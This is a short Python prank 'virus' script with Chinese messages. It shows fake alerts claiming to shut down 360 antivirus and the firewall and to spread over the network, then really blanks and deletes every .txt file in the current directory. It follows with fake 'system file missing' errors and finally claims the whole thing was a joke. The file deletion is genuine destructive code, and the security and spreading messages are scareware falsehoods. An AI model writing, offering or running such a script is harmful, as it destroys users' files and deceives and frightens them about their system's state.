import os,sys,time,tkinter
from tkinter import messagebox
    
path = os.getcwd()
file_name=os.listdir(path)
l=len(file_name)
n=0
s=0

print("病毒程序正在启动")
tkinter.messagebox.showwarning(title='提示', message='病毒正在启动')
time.sleep(1)
print("正在关闭杀毒软件")
time.sleep(1)
tkinter.messagebox.showwarning(title='360杀毒', message='程序出现问题，点击确认关闭')
tkinter.messagebox.showwarning(title='360安全卫士', message='程序出现问题，点击确认关闭')
tkinter.messagebox.showwarning(title='防火墙', message='程序出现问题，点击确认关闭')
print("关闭成功")
time.sleep(0.5)
print("正在启用删除函数")
time.sleep(0.1)
print("正在发布网络病毒")
time.sleep(2)
tkinter.messagebox.showwarning(title='警告', message='此程序已扩散到网络')
print("病毒扩展成功")
time.sleep(0.2)
print("警告：即将删除所有系统文件")
print("当前目录：",path)
time.sleep(0.5)

for i in range (l):
    file=file_name[n]
    if (file != os.path.basename(sys.argv[0])):
        if(file.endswith(".txt")==1):
            s=s+1
            f=open(file,"w")
            f.write("")
            f.close()
            print("删除成功")
            print("文件名：",file)
            print("文件地址：",path,"\n")
            os.remove(file)
        else:
            print("只删除txt文件")
            print("文件名：",file)
            print("文件地址：",path,"\n")
    else:
        print("已自动跳过程序本身")
        print("文件名：",file)
        print("文件地址：",path,"\n")
    n=n+1
        
if(n==1):
    print("未发现任何其他系统文件")
else:
    print("所有系统文件删除成功")

t=1
for i in range(l-2):
    messagebox.showerror(title="错误", message="系统文件"+str(t)+" 缺失")
    t=t+1

print("5秒后病毒程序自动关闭")
time.sleep(5)
tkinter.messagebox.showinfo(title='哈哈哈', message='以上纯属开玩笑')
